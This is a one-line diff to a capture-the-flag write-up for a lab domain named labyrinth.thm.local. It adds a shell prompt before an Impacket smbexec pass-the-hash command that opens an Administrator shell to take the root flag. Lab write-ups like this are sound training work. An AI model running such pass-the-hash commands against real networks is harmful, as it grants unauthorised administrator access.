@@ -360,7 +360,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 Finally, we can grab a shell with Impacket's WMIExec or SMBExec in a Pass-The-Hash which rewards us with the root flag under the administrator's desktop folder.
 
 ```
-impacket-smbexec -k -hashes ':[REDACTED]' THM.LOCAL/Administrator@labyrinth.thm.local
+$ impacket-smbexec -k -hashes ':[REDACTED]' THM.LOCAL/Administrator@labyrinth.thm.local
 ```
 
 ![](../assets/img/2026-03-09-Ledger/11.png)
